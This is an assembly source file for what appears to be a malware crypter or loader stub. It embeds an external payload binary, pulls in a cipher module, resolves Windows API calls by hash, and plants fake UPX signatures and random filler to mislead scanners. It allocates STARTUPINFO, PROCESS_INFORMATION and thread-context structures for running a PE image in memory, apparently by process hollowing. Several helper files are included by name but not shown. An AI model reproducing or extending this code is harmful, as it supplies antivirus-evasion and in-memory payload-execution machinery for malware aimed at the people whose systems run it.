align 16

%include "macro.asm"

section .data

mMYSTRU dd RANDOM32 ;
MYSTRUOFF dd RANDOM32
vRPEBASE	dd RANDOM32 ; Will old the PE  base value
PEENTRY dd RANDOM32; PE Entrypoint
PEIMAGEBASE dd RANDOM32 ; Will the PE base value  
PIMAGEBASE dd RANDOM32
PESECTION dw RANDOM16 ; Sections Count
PEZOFIMAGE dd RANDOM32
PEZOFHEADERS dd RANDOM32 
PEOPTHEADER dd RANDOM32
%include "payload.inc"
%include "hashs.inc"

; Define de ma structure de structures 
%define MYSTRU__SIS_LEN       0x44
%define MYSTRU__PIS_LEN       0x10
%define MYSTRU__CTX_LEN       0x2BC + 4 
%define MYSTRU__FILENAME_LEN  512
%define MYSTRU__OPTION_LEN    512
%define MYSTRU__PE_LEN        EPELEN 

%define MYSTRU__SIS      0x0
%define MYSTRU__PIS      MYSTRU__SIS_LEN  ; + len SIS 
%define MYSTRU__CTX      MYSTRU__SIS_LEN + MYSTRU__PIS_LEN  ; + len SIS et PIS   
%define MYSTRU__FILENAME MYSTRU__CTX_LEN + MYSTRU__SIS_LEN + MYSTRU__PIS_LEN 
%define MYSTRU__OPTION   MYSTRU__FILENAME_LEN + MYSTRU__CTX_LEN + MYSTRU__SIS_LEN + MYSTRU__PIS_LEN 
%define MYSTRU__PE       MYSTRU__OPTION_LEN +  MYSTRU__FILENAME_LEN + MYSTRU__CTX_LEN + MYSTRU__SIS_LEN + MYSTRU__PIS_LEN 
%define MYSTRU__LEN      MYSTRU__PE_LEN +  MYSTRU__OPTION_LEN +  MYSTRU__FILENAME_LEN + MYSTRU__CTX_LEN + MYSTRU__SIS_LEN + MYSTRU__PIS_LEN 

section .bss
  numCharsWritten:        resb 1

section .text
fakeupx db "0.39",0,"UPX!" , 0x0d, 0X09,0X02,0X08,0X3f,0X3a,0Xcc


PAYLOAD incbin  "payload.bin"


%include "bbcypher.asm"
%include "dllmgt.asm"
%include "peexec.asm"


GLOBAL _start

; ########## MAIN PROGRAM ##############
fakeUPX db "0.39UPX!"

_start:
 ; Pub 
 
  ; Reserve Memory for the PE image, SIS, PIS et CTX
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_VIRTUALALLOC
	invokel eax, NULL, MYSTRU__LEN, MEM_COMMIT, PAGE_READWRITE
	mov	ebp,eax ;   Save memory location


  ; Address de retour
  push  _fend 
  ; Commence le grand tour 
  jmp _getexec

_fend  
  ; Cleanup affichage bug dans CMD
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_SLEEP
  invokel eax, 1000
  invoke _ExitProcess@4, NULL
	ret

